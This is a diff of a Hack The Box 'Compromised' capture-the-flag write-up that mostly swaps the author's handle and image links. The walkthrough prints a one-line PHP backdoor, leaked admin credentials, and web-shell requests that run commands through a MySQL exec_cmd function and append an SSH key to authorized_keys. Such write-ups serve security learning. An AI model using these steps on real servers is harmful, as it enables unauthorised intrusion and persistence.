@@ -9,6 +9,7 @@ avatar: assets/htb/compromised.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Compromised
 ---
+
 ## Overview
 
 TODO: finish writeup, and clean up
@@ -20,7 +21,7 @@ TODO: finish writeup, and clean up
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ nmap -sCV -n -p- -Pn -v <YOUR_IP>
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 15:53 EST
@@ -75,23 +76,23 @@ Only two ports open, 22 - SSH, and 80 - HTTP
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-compromised-duckies.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-compromised-duckies.png)
 
 Website selling rubber duckies on port 80; 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-litecart.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-litecart.png)
 
 `Powered by LiteCart` need to find version to see if there are any vulnerabilities
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-admin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-admin.png)
 
 In the contact information found an email address `admin@compromised.htb`, which gave me a potential username, and a domain name.  I added this to my `/etc/hosts` file. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-create-account.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-create-account.png)
 
 Created an account on the site
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-reset-password-fail.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-reset-password-fail.png)
 
 I tried to reset the password for the email address I had found, but was told that it didn't exist in the database.  I could potentially use this to find valid users later since the error is too verbose.
 
@@ -99,12 +100,12 @@ No SQL injection was possible in the input fields.
 
 I ran dirbuster and found a folder `/backup`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-compromised-backup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-compromised-backup.png)
 
 `/backup` contained a zip file `a.tar.gz`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ tar -xvf a.tar.gz       
 shop/
 shop/.htaccess
@@ -200,145 +201,145 @@ shop/ext/index.html
 It seemed like a backup of the whole file structure of the site. There definitely had to be some interesting information in here, but there was a lot to go through. After searching through the files for awhile, it looked like the site had been compromised at some point, since there was a PHP backdoor included in the backup.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop]
+┌──(kac0㉿kali)-[~/htb/compromised/shop]
 └─$ cat robots.txt                                  
 User-agent: *
 Allow: /
 Disallow: */cache/*
 Sitemap: /feeds/sitemap.xml
 
-┌──(zweilos㉿kali)-[~/htb/compromised/shop]
+┌──(kac0㉿kali)-[~/htb/compromised/shop]
 └─$ cat .sh.php    
 <?php system($_REQUEST['cmd']); ?>
 ```
 
 The `robots.txt` and `sitemap.xml` did not exist on the live site, perhaps they were removed after the site was compromised?
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-no-robots.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-no-robots.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-no-sitemap.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-no-sitemap.png)
 
 {% hint style="info" %}
 Post-completion edit: yes these files exist, I had been looking for them in the root, not in the **`/shop`** directory.
 {% endhint %}
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop/admin]
+┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
 └─$ grep -r pass                                                                 
 admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-again-logfile-includes-library.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-again-logfile-includes-library.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-pass-grep.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pass-grep.png)
 
 The `/admin` folder looked like a good place to start searching. I did a search for passwords in the files, and 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-login-php.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-login-php.png)
 
 the login page of the admin folder contained a reference to a log file that usernames and passwords were being written to
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop/admin]
+┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
 └─$ ls -la
 total 116
-drwxr-xr-x 24 zweilos zweilos 4096 Sep  3 07:50 .
-drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 ..
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 addons.widget
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 appearance.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 catalog.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 countries.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 currencies.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 customers.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 discussions.widget
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 geo_zones.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 graphs.widget
--rw-r--r--  1 zweilos zweilos 6460 May 14  2018 index.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 languages.app
--rw-r--r--  1 zweilos zweilos 1364 Sep  3 07:50 login.php
--rw-r--r--  1 zweilos zweilos  203 May 14  2018 logout.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 modules.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 orders.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 orders.widget
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 pages.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 reports.app
--rw-r--r--  1 zweilos zweilos 4094 May 14  2018 search_results.json.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 settings.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 slides.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 stats.widget
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 tax.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 translations.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 users.app
-drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 vqmods.app
+drwxr-xr-x 24 kac0 kac0 4096 Sep  3 07:50 .
+drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 ..
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 addons.widget
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 appearance.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 catalog.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 countries.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 currencies.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 customers.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 discussions.widget
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 geo_zones.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 graphs.widget
+-rw-r--r--  1 kac0 kac0 6460 May 14  2018 index.php
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 languages.app
+-rw-r--r--  1 kac0 kac0 1364 Sep  3 07:50 login.php
+-rw-r--r--  1 kac0 kac0  203 May 14  2018 logout.php
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 modules.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 orders.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 orders.widget
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 pages.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 reports.app
+-rw-r--r--  1 kac0 kac0 4094 May 14  2018 search_results.json.php
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 settings.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 slides.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 stats.widget
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 tax.app
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 translations.app
+drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 users.app
+drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 vqmods.app
 ```
 
 The file `login.php` had been modified more recently than everything else here, perhaps to comment out that line
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop/includes]
+┌──(kac0㉿kali)-[~/htb/compromised/shop/includes]
 └─$ ls -la
 total 80
-drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 .
-drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 ..
--rw-r--r--  1 zweilos zweilos 1955 May 14  2018 app_footer.inc.php
--rw-r--r--  1 zweilos zweilos  996 May 14  2018 app_header.inc.php
--rw-r--r--  1 zweilos zweilos 1808 May 14  2018 autoloader.inc.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 boxes
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 classes
--rw-r--r--  1 zweilos zweilos 6064 May 14  2018 compatibility.inc.php
--rw-r--r--  1 zweilos zweilos 9376 May 28  2020 config.inc.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 controllers
--rw-r--r--  1 zweilos zweilos 2537 May 14  2018 error_handler.inc.php
-drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 functions
--rw-r--r--  1 zweilos zweilos    0 May 14  2018 index.html
-drwxr-xr-x  2 zweilos zweilos 4096 Sep  3 07:49 library
-drwxr-xr-x  8 zweilos zweilos 4096 May 14  2018 modules
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 references
-drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 routes
-drwxr-xr-x  4 zweilos zweilos 4096 May 14  2018 templates
+drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 .
+drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 ..
+-rw-r--r--  1 kac0 kac0 1955 May 14  2018 app_footer.inc.php
+-rw-r--r--  1 kac0 kac0  996 May 14  2018 app_header.inc.php
+-rw-r--r--  1 kac0 kac0 1808 May 14  2018 autoloader.inc.php
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 boxes
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 classes
+-rw-r--r--  1 kac0 kac0 6064 May 14  2018 compatibility.inc.php
+-rw-r--r--  1 kac0 kac0 9376 May 28  2020 config.inc.php
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 controllers
+-rw-r--r--  1 kac0 kac0 2537 May 14  2018 error_handler.inc.php
+drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 functions
+-rw-r--r--  1 kac0 kac0    0 May 14  2018 index.html
+drwxr-xr-x  2 kac0 kac0 4096 Sep  3 07:49 library
+drwxr-xr-x  8 kac0 kac0 4096 May 14  2018 modules
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 references
+drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 routes
+drwxr-xr-x  4 kac0 kac0 4096 May 14  2018 templates
 ```
 
 The `/includes/library` folder had also been modified on Sep 3
 
 ```text
-┌──(zweilos㉿kali)-[~/…/compromised/shop/includes/library]
+┌──(kac0㉿kali)-[~/…/compromised/shop/includes/library]
 └─$ ls -la
 total 200
-drwxr-xr-x  2 zweilos zweilos  4096 Sep  3 07:49 .
-drwxr-xr-x 11 zweilos zweilos  4096 Dec 26 18:26 ..
--rw-r--r--  1 zweilos zweilos     0 May 14  2018 index.html
--rw-r--r--  1 zweilos zweilos  1372 May 14  2018 lib_breadcrumbs.inc.php
--rw-r--r--  1 zweilos zweilos  9237 May 14  2018 lib_cache.inc.php
--rw-r--r--  1 zweilos zweilos 15785 May 14  2018 lib_cart.inc.php
--rw-r--r--  1 zweilos zweilos   297 May 14  2018 lib_catalog.inc.php
--rw-r--r--  1 zweilos zweilos   890 May 14  2018 lib_compression.inc.php
--rw-r--r--  1 zweilos zweilos  8068 May 14  2018 lib_currency.inc.php
--rw-r--r--  1 zweilos zweilos 12441 May 14  2018 lib_customer.inc.php
--rw-r--r--  1 zweilos zweilos  6931 May 14  2018 lib_database.inc.php
--rw-r--r--  1 zweilos zweilos 11532 May 14  2018 lib_document.inc.php
--rw-r--r--  1 zweilos zweilos  1640 May 14  2018 lib_form.inc.php
--rw-r--r--  1 zweilos zweilos   379 May 14  2018 lib_functions.inc.php
--rw-r--r--  1 zweilos zweilos 12236 May 14  2018 lib_language.inc.php
--rw-r--r--  1 zweilos zweilos  2939 May 14  2018 lib_length.inc.php
--rw-r--r--  1 zweilos zweilos  7690 May 14  2018 lib_link.inc.php
--rw-r--r--  1 zweilos zweilos  2002 May 14  2018 lib_notices.inc.php
--rw-r--r--  1 zweilos zweilos  2787 May 14  2018 lib_reference.inc.php
--rw-r--r--  1 zweilos zweilos  8388 May 14  2018 lib_route.inc.php
--rw-r--r--  1 zweilos zweilos 10894 May 14  2018 lib_security.inc.php
--rw-r--r--  1 zweilos zweilos  2256 May 14  2018 lib_session.inc.php
--rw-r--r--  1 zweilos zweilos  2413 May 14  2018 lib_settings.inc.php
--rw-r--r--  1 zweilos zweilos  3508 May 14  2018 lib_stats.inc.php
--rw-r--r--  1 zweilos zweilos  7227 May 14  2018 lib_tax.inc.php
--rw-r--r--  1 zweilos zweilos  8317 Sep  3 07:49 lib_user.inc.php
--rw-r--r--  1 zweilos zweilos  4218 May 14  2018 lib_volume.inc.php
--rw-r--r--  1 zweilos zweilos  2371 May 14  2018 lib_weight.inc.php
+drwxr-xr-x  2 kac0 kac0  4096 Sep  3 07:49 .
+drwxr-xr-x 11 kac0 kac0  4096 Dec 26 18:26 ..
+-rw-r--r--  1 kac0 kac0     0 May 14  2018 index.html
+-rw-r--r--  1 kac0 kac0  1372 May 14  2018 lib_breadcrumbs.inc.php
+-rw-r--r--  1 kac0 kac0  9237 May 14  2018 lib_cache.inc.php
+-rw-r--r--  1 kac0 kac0 15785 May 14  2018 lib_cart.inc.php
+-rw-r--r--  1 kac0 kac0   297 May 14  2018 lib_catalog.inc.php
+-rw-r--r--  1 kac0 kac0   890 May 14  2018 lib_compression.inc.php
+-rw-r--r--  1 kac0 kac0  8068 May 14  2018 lib_currency.inc.php
+-rw-r--r--  1 kac0 kac0 12441 May 14  2018 lib_customer.inc.php
+-rw-r--r--  1 kac0 kac0  6931 May 14  2018 lib_database.inc.php
+-rw-r--r--  1 kac0 kac0 11532 May 14  2018 lib_document.inc.php
+-rw-r--r--  1 kac0 kac0  1640 May 14  2018 lib_form.inc.php
+-rw-r--r--  1 kac0 kac0   379 May 14  2018 lib_functions.inc.php
+-rw-r--r--  1 kac0 kac0 12236 May 14  2018 lib_language.inc.php
+-rw-r--r--  1 kac0 kac0  2939 May 14  2018 lib_length.inc.php
+-rw-r--r--  1 kac0 kac0  7690 May 14  2018 lib_link.inc.php
+-rw-r--r--  1 kac0 kac0  2002 May 14  2018 lib_notices.inc.php
+-rw-r--r--  1 kac0 kac0  2787 May 14  2018 lib_reference.inc.php
+-rw-r--r--  1 kac0 kac0  8388 May 14  2018 lib_route.inc.php
+-rw-r--r--  1 kac0 kac0 10894 May 14  2018 lib_security.inc.php
+-rw-r--r--  1 kac0 kac0  2256 May 14  2018 lib_session.inc.php
+-rw-r--r--  1 kac0 kac0  2413 May 14  2018 lib_settings.inc.php
+-rw-r--r--  1 kac0 kac0  3508 May 14  2018 lib_stats.inc.php
+-rw-r--r--  1 kac0 kac0  7227 May 14  2018 lib_tax.inc.php
+-rw-r--r--  1 kac0 kac0  8317 Sep  3 07:49 lib_user.inc.php
+-rw-r--r--  1 kac0 kac0  4218 May 14  2018 lib_volume.inc.php
+-rw-r--r--  1 kac0 kac0  2371 May 14  2018 lib_weight.inc.php
 ```
 
 Checking the files in this folder lead to `lib_user.inc.php`. This file was also modified on September 3, and contained references to same hidden log file.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-passhash-found.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-passhash-found.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-passhash-file.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-passhash-file.png)
 
 searching the rest of the folders found password hash in `includes/config.inc.php` 
 
@@ -348,12 +349,12 @@ includes/config.inc.php:  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOL
 
 I tried cracking this hash using hashcat, but was unsuccessful.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-database-info.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-database-info.png)
 
 This file also included possible database creds and names of all of the tables
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop]
+┌──(kac0㉿kali)-[~/htb/compromised/shop]
 └─$ grep -ir .log2301c9430d8593ae.txt
 admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
 includes/library/lib_user.inc.php:      //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $username . " Passwd: " . $password);
@@ -362,7 +363,7 @@ includes/library/lib_user.inc.php:      //file_put_contents("./.log2301c9430d859
 After getting sidetracked for awhile looking for potential passwords and hashes, I went back to looking at the modified files.  Both files contained the same reference to this hidden log file, and both had been modified on Sep 3
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised/shop]
+┌──(kac0㉿kali)-[~/htb/compromised/shop]
 └─$ find . -newermt "Sep 3"              
 ./admin
 ./admin/login.php
@@ -374,21 +375,21 @@ After getting sidetracked for awhile looking for potential passwords and hashes,
 
 There were only a few files modified on that day; There were no files in `/admin/users.app/` that had been modified that day, so something had likely been deleted from there
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-found-pass.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-found-pass.png)
 
 I found the log file by navigating to it in my browser.  The file contained credentials for an admin user `User: admin Passwd: theNextGenSt0r3!~`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-admin-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-admin-login.png)
 
 Using these creds I tried to login to the admin page; 
 
 after logging in I got an interesting message that said some thing of the sort: "The last time you logged in was at IP 10.10.14.27. If this was not you your credentials may have been compromised". Unfortunately the message disappeared before I could screenshot it. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-comprmised-creds-lol.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-comprmised-creds-lol.png)
 
 There was also a banner that said that the admin account was not `.htpasswd` protected
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-upload-success%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-success%2520%25281%2529.png)
 
 I noticed in the bottom corner of the page that the version of LiteCart they were using was 2.1.2, so I looked up whether there were any known vulnerabilities associated with that version
 
@@ -409,26 +410,26 @@ To use the exploit I needed to supply admin credentials, and the path of the adm
 [https://stackoverflow.com/questions/8405096/python-3-2-cookielib](https://stackoverflow.com/questions/8405096/python-3-2-cookielib)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ python3 litecart_exploit.py -t http://<YOUR_IP>/shop/admin -u admin -p 'theNextGenSt0r3!~'
 Sorry something went wrong
 ```
 
 hmmm...next I looked at the code in the python exploit and manually tried to exploit it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-file-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-file-upload.png)
 
 Files to upload had to be `.xml`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-upload-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-test.png)
 
 I was able to upload my web-shell and access it by disquising it as an xml file using burp
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-upload-success-usd-.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-success-usd-.png)
 
  Upload success
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-command-timeout%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-command-timeout%2520%25281%2529%2520%25281%2529.png)
 
 I could not get any commands to run. They would all time out, so I guessed there was a firewall or something blocking it
 
@@ -436,25 +437,25 @@ I could not get any commands to run. They would all time out, so I guessed there
 
 ### Enumeration through `phpinfo()`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-php-info1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info1.png)
 
 I tried to get the version of PHP that the server was running using the `phpinfo()` method, and got back a ton of information from the server. There was pages and pages of configuration and environment information about the server and the current running context. version 7.2.24-0ubuntu0.18.04.6
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-php-info2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info2.png)
 
 More information, user context is www-data
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-php-info3.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info3.png)
 
 Information overload
 
 ### The PHP `disabled_functions`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-php-info4.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info4.png)
 
 After looking closely through all of the output, I noticed that there was a section called "disabled functions" which held all of the methods of code execution that I knew of 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-php-info5.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info5.png)
 
 There were many functions disabled.  Most had to do with executing code in some way, and some other interesting sounding php functions I didn't know of...but couldn't use here anyway
 
@@ -476,25 +477,25 @@ The last one only works up to 7.2.19,
 
 but there was another one from the same author that work up to 7.3; I modified the exploit POC to allow me to supply arbitrary commands, uploaded it, and tested it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-code-execution.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-code-execution.png)
 
 Success! I had code execution. I was running in the context of `www-data`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-code-execution-passwd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-code-execution-passwd.png)
 
 Got `/etc/passwd` There were three users who could login: sysadmin, mysql, and root
 
 ### The `mysql` daemon
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-pas-aux-mysql.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-pas-aux-mysql.png)
 
 Checked output of `ps aux` and noticed mysqld was running. Perhaps I could enumerate the database since I had seen the tables and login information earlier
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql.png)
 
 I checked to see what configuration files there were for mysqld
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-running.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-running.png)
 
 Found a way to execute shell commands using mysql
 
@@ -503,17 +504,17 @@ Found a way to execute shell commands using mysql
 
 If there was a way to do this, maybe from the command line too
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-databases.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-databases.png)
 
 Enumerated databases
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-ecom-tables.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-ecom-tables.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"show+tables"+ecom HTTP/1.1`
 
 Listed tables in the `ecom` database.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-code-exec%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-code-exec%2520%25281%2529.png)
 
 got code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`
 
@@ -595,13 +596,13 @@ exec_cmd    0    libmysql.so    function
 
 There was one function stored in the `func` table in the `mysql` database called `exec_cmd`.  I tried to use this function directly, but id didn't work.  After some trial and error I found out that it had to used together with the `SELECT` SQL command.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-code-exec2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-code-exec2.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('id')"+mysql HTTP/1.1`
 
 From these results I could see that this function was running in the context of the user `mysql`. Since I knew that this user could log in, I tried to insert my SSH public key into their `.ssh/authorized_keys` file so I could login using SSH.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-mysql-mysql-sshkey.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-mysql-sshkey.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('echo+ecdsa-sha2-nistp256+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNqKR/rHfuv30j7eOmU85z%2bEKhPfUFtn9WEARBZzwF6LFTCgjZzqAF0GevT3b22Z5iqwETgfF%2bQcmjAw3Ld9VY%3d+>>+~/.ssh/authorized_keys')"+mysql HTTP/1.1`
 
@@ -610,7 +611,7 @@ From these results I could see that this function was running in the context of 
 ### Enumeration as `mysql`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/compromised]
+┌──(kac0㉿kali)-[~/htb/compromised]
 └─$ ssh mysql@<YOUR_IP> -i compromised.key                                                     130 ⨯
 Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
 mysql@compromised:~$ id && hostname
@@ -776,7 +777,7 @@ lrwxrwxrwx 1 root sysadmin    9 May 13  2020 .bash_history -> /dev/null
 -rw-r--r-- 1 root sysadmin  807 May 13  2020 .profile
 -r--r----- 1 root sysadmin   33 Dec 25 05:48 user.txt
 sysadmin@compromised:~$ cat user.txt 
-50df****e03d
+50df************************e03d
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -810,7 +811,7 @@ sysadmin@compromised:/dev/shm$
 I was unable to ping my computer, so I was worried that I wouldn't be able to connect back to my machine. I thought about using base64 "copy-pasta" to transfer files, but after an "Oh duh!" moment I remembered that I was able to SSH in, and therefore could use SCP to get files in.
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ scp ./linpeas.sh sysadmin@<YOUR_IP>:/dev/shm/lp                                  
 sysadmin@<YOUR_IP>'s password: 
 linpeas.sh                                                            100%  286KB 435.1KB/s   00:00
@@ -924,11 +925,11 @@ After doing some basic analysis with strings and finding nothing, I copied the f
 
 ### Using Ghidra for binary analysis
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-ghidra-little-endian.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-ghidra-little-endian.png)
 
